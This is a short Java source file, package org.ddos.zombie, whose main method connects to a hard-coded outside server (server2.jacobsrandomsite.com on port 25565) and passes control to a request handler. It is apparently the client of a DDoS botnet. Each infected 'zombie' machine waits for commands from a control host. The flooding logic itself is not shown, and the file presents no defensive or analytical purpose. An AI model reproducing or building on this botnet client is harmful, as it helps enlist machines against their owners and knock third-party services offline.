package org.ddos.zombie;

import java.io.IOException;

import org.ddos.network.ZombieNetwork;
import org.jnetwork.Connection;

public class ZombieMain {
	public static void main(String[] args) {
		try {
			ZombieNetwork.setClient(new Connection("server2.jacobsrandomsite.com", 25565));
			RequestHandler.handleRequest();
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}